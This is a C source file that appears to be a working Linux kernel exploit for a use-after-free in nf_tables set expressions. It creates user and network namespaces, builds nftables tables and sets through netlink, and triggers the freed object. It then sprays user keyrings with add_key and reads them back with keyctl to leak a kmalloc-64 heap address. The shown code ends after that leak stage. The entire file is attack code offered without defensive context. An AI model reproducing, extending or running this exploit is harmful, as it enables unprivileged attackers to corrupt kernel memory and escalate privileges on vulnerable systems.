//gcc exp.c -o exp -l mnl -l nftnl -w

#define _GNU_SOURCE
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <libmnl/libmnl.h>
#include <libnftnl/expr.h>
#include <libnftnl/table.h>
#include <libnftnl/set.h>
#include <linux/netfilter.h>
#include <linux/netfilter/nf_tables.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <stdint.h>
#include <syscall.h>
#include <linux/keyctl.h>

#define KEY_DESC_MAX_SIZE 40
#define SPRAY_KEY_SIZE 50
#define SPRAY_SIZE 1000
#define USHRT_MAX (65535U)

typedef int32_t key_serial_t;
uint64_t heap_base;

static inline key_serial_t add_key(const char *type, const char *description, const void *payload, size_t plen, key_serial_t ringid) {
    return syscall(__NR_add_key, type, description, payload, plen, ringid);
}

static inline long keyctl(int operation, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5) {
    return syscall(__NR_keyctl, operation, arg2, arg3, arg4, arg5);
}

void set_cpu_affinity(int cpu_n, pid_t pid) {
    cpu_set_t set;

    CPU_ZERO(&set);
    CPU_SET(cpu_n, &set);

    if (sched_setaffinity(pid, sizeof(set), &set) < 0)
        do_error_exit("sched_setaffinity");
}

void unshare_setup(uid_t uid, gid_t gid)
{
    int temp;
    char edit[0x100];

    unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET);

    temp = open("/proc/self/setgroups", O_WRONLY);
    write(temp, "deny", strlen("deny"));
    close(temp);

    temp = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", uid);
    write(temp, edit, strlen(edit));
    close(temp);

    temp = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", gid);
    write(temp, edit, strlen(edit));
    close(temp);

    return;
}

void do_error_exit(char *info)
{
    puts(info);
    exit(-1);
}

void bye(char *info)
{
    puts(info);
    exit(-2);
}

int get_keyring_leak(key_serial_t *id_buffer, uint32_t id_buffer_size) {
    
    uint8_t buffer[USHRT_MAX] = {0};
    int32_t keylen;

    for (uint32_t i = 0; i < id_buffer_size; i++) {

        keylen = keyctl(KEYCTL_READ, id_buffer[i], (long)buffer, 0x10, 0);
        if (keylen < 0)
            bye("keyctl");

        if(!strncmp(&buffer[6],"\xff\xff", 2))
        {
            heap_base = *((uint64_t*)buffer);
            printf("[+] leak successed, kmalloc-64 heap: 0x%llx\n", heap_base);
            return i;
        }
        else
            printf("[-] leak failed, idkval: %s\n", buffer);
    }
    return id_buffer_size;
}

key_serial_t *spray_keyring(uint32_t start, uint32_t spray_size) {

    char key_desc[KEY_DESC_MAX_SIZE];
    key_serial_t *id_buffer = calloc(spray_size, sizeof(key_serial_t));

    if (id_buffer == NULL)
        bye("calloc");

    for (uint32_t i = start; i < start+spray_size; i++) {
        snprintf(key_desc, KEY_DESC_MAX_SIZE, "SPRAY-RING-%03du", i);
        id_buffer[i] = add_key("user", key_desc, key_desc, strlen(key_desc), KEY_SPEC_PROCESS_KEYRING);
        if (id_buffer[i] < 0)
            bye("add_key");
    }

    return id_buffer;
}

void set_stable_table_and_set(struct mnl_socket* nl, const char *name)
{
    char * table_name = name;
    char * set_name = NULL;
    uint8_t family = NFPROTO_IPV4;
    uint32_t set_id = 1;

    // a table for the sets to be associated with
    struct nftnl_table * table = nftnl_table_alloc();
    nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);
    nftnl_table_set_u32(table, NFTNL_TABLE_FLAGS, 0);

    struct nftnl_set * set_stable =  nftnl_set_alloc();
    set_name = "set_stable";
    nftnl_set_set_str(set_stable, NFTNL_SET_TABLE, table_name);
    nftnl_set_set_str(set_stable, NFTNL_SET_NAME, set_name);
    nftnl_set_set_u32(set_stable, NFTNL_SET_KEY_LEN, 1);
    nftnl_set_set_u32(set_stable, NFTNL_SET_FAMILY, family);
    nftnl_set_set_u32(set_stable, NFTNL_SET_ID, set_id++);

    // expressions
    struct nftnl_expr * exprs[128];
    int exprid = 0;

    // serialize
    char buf[MNL_SOCKET_BUFFER_SIZE*2];

    struct mnl_nlmsg_batch * batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
    int seq = 0;

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    struct nlmsghdr * nlh;
    int table_seq = seq;

    nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
NFT_MSG_NEWTABLE, family, NLM_F_CREATE|NLM_F_ACK, seq++);
    nftnl_table_nlmsg_build_payload(nlh, table);
    mnl_nlmsg_batch_next(batch);

    // add set_stable
    nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                    NFT_MSG_NEWSET, family,
                                    NLM_F_CREATE|NLM_F_ACK, seq++);
    nftnl_set_nlmsg_build_payload(nlh, set_stable);
    nftnl_set_free(set_stable);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (nl == NULL) {
        err(1, "mnl_socket_open");
    }

    printf("[+] setting stable %s and set\n", table_name);
    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "mnl_socket_send");
    }
}

void set_trigger_set_and_overwrite(struct mnl_socket* nl, const char *name, const char *set_name)
{
    char * table_name = name;
    uint8_t family = NFPROTO_IPV4;
    uint32_t set_id = 1;
    struct nftnl_expr * exprs[128];
    int exprid = 0;
    struct nlmsghdr * nlh;

    struct nftnl_set * set_trigger = nftnl_set_alloc();

    nftnl_set_set_str(set_trigger, NFTNL_SET_TABLE, table_name);
    nftnl_set_set_str(set_trigger, NFTNL_SET_NAME, set_name);
    nftnl_set_set_u32(set_trigger, NFTNL_SET_FLAGS, NFT_SET_EXPR);
    nftnl_set_set_u32(set_trigger, NFTNL_SET_KEY_LEN, 1);
    nftnl_set_set_u32(set_trigger, NFTNL_SET_FAMILY, family);
    nftnl_set_set_u32(set_trigger, NFTNL_SET_ID, set_id);
    exprs[exprid] = nftnl_expr_alloc("lookup");
    nftnl_expr_set_str(exprs[exprid], NFTNL_EXPR_LOOKUP_SET, "set_stable");
    nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_LOOKUP_SREG, NFT_REG_1);
    nftnl_set_add_expr(set_trigger, exprs[exprid]);
    exprid++;

    char buf[MNL_SOCKET_BUFFER_SIZE*2];

    struct mnl_nlmsg_batch * batch = mnl_nlmsg_batch_start(buf, sizeof(buf));
    int seq = 0;

    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),
                                    NFT_MSG_NEWSET, family,
                                    NLM_F_CREATE|NLM_F_ACK, seq++);
    nftnl_set_nlmsg_build_payload(nlh, set_trigger);
    nftnl_set_free(set_trigger);
    mnl_nlmsg_batch_next(batch);

    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);
    mnl_nlmsg_batch_next(batch);

    if (nl == NULL) {
        err(1, "mnl_socket_open");
    }

    if (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),
mnl_nlmsg_batch_size(batch)) < 0) {
        err(1, "mnl_socket_send");
    }

    printf("[+] triggering UAF set and overwrite *(prevchunk+0x18)\n");
}

int main(int argc, char ** argv)
{
    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);
    setvbuf(stderr, 0, 2, 0);
    int uaf_id = 0;

    unshare_setup(getuid(), getgid());

    set_cpu_affinity(0, 0);

    struct mnl_socket* nl = mnl_socket_open(NETLINK_NETFILTER);

    printf("\n\n[------------------------- stage 0: Allocate stable table and set ------------------------]\n");
    set_stable_table_and_set(nl, "table1");

    printf("\n\n[------------------------- stage 1: Leak heap address ------------------------------------]\n");
    set_trigger_set_and_overwrite(nl, "table1", "set_trigger0");
    key_serial_t *id_buffer = spray_keyring(0, SPRAY_KEY_SIZE);
    set_trigger_set_and_overwrite(nl, "table1", "set_trigger1");
    if((uaf_id = get_keyring_leak(id_buffer, SPRAY_KEY_SIZE)) == SPRAY_KEY_SIZE)
        bye("[-] leak failed...");
    return 0;
}
